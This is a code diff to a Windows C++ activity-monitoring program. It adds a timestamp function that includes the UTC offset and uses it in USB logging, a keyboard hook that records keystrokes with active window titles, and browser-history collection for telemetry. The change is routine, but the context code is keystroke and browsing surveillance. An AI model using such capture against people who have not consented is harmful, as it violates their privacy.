@@ -273,6 +273,7 @@ struct USBDeviceEntry {
 // Function declarations
 std::string getMacAddress();
 std::string getCurrentDateTimeString();
+std::string getWireDateTimeString();
 std::string getActiveWindowTitle();
 std::string getKeyName(DWORD vkCode, DWORD scanCode, DWORD flags);
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
@@ -480,7 +481,7 @@ void setupUSBMONITORING() {
                             }
                             
                             Json::Value usbLog;
-                            usbLog["date"] = getCurrentDateTimeString();
+                            usbLog["date"] = getWireDateTimeString();
                             usbLog["device_name"] = deviceName;
                             usbLog["device_path"] = deviceIdStr;
                             usbLog["device_type"] = "USB Device";
@@ -506,7 +507,7 @@ void setupUSBMONITORING() {
                 if (currentDevices.find(device) == currentDevices.end()) {
                     // Device disconnected
                     Json::Value usbLog;
-                    usbLog["date"] = getCurrentDateTimeString();
+                    usbLog["date"] = getWireDateTimeString();
                     usbLog["device_name"] = "USB Device";
                     usbLog["device_path"] = device;
                     usbLog["device_type"] = "USB Device";
@@ -654,6 +655,25 @@ std::string getCurrentDateTimeString() {
     auto time_t = std::chrono::system_clock::to_time_t(now);
     std::stringstream ss;
     ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
+    return ss.str();
+}
+
+// Timestamp used for telemetry payloads. Include the Windows machine's UTC
+// offset so the backend can normalize independently of server timezone.
+std::string getWireDateTimeString() {
+    TIME_ZONE_INFORMATION tz{};
+    DWORD state=GetTimeZoneInformation(&tz);
+    LONG bias=tz.Bias;
+    if(state==TIME_ZONE_ID_DAYLIGHT) bias+=tz.DaylightBias;
+    else if(state==TIME_ZONE_ID_STANDARD) bias+=tz.StandardBias;
+    const LONG east=-bias;
+    const LONG magnitude=east<0?-east:east;
+    auto now=std::chrono::system_clock::now();
+    auto stamp=std::chrono::system_clock::to_time_t(now);
+    std::stringstream ss;
+    ss << std::put_time(std::localtime(&stamp), "%Y-%m-%dT%H:%M:%S")
+       << (east>=0?"+":"-") << std::setfill('0') << std::setw(2)
+       << (magnitude/60) << ":" << std::setw(2) << (magnitude%60);
     return ss.str();
 }
 
@@ -1306,7 +1326,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             // Prepare data outside of critical section
             std::string application = getActiveWindowTitle();
             std::string keyName = getKeyName(kbStruct->vkCode, kbStruct->scanCode, kbStruct->flags);
-            std::string timestamp = getCurrentDateTimeString();
+            std::string timestamp = getWireDateTimeString();
             
             // Check for modifier keys
             std::string modifiers;
@@ -1378,7 +1398,7 @@ void collectBrowserHistory() {
                 history["url"] = entry["url"];
                 history["title"] = entry["title"];
                 history["last_visit"] = entry["last_visit"];
-                history["date"] = getCurrentDateTimeString();
+                history["date"] = getWireDateTimeString();
                 
                 // Track the latest time we've seen
                 int64_t visitTime = entry["last_visit"].asInt64();
@@ -1421,7 +1441,7 @@ void collectBrowserHistory() {
                 history["url"] = entry["url"];
                 history["title"] = entry["title"];
                 history["last_visit"] = entry["last_visit"];
-                history["date"] = getCurrentDateTimeString();
+                history["date"] = getWireDateTimeString();
                 
                 // Track the latest time we've seen
                 int64_t visitTime = entry["last_visit"].asInt64();
@@ -1453,7 +1473,7 @@ void collectBrowserHistory() {
                 history["url"] = entry["url"];
                 history["title"] = entry["title"];
                 history["last_visit"] = entry["last_visit"];
-                history["date"] = getCurrentDateTimeString();
+                history["date"] = getWireDateTimeString();
                 
                 // Track the latest time we've seen
                 int64_t visitTime = entry["last_visit"].asInt64();
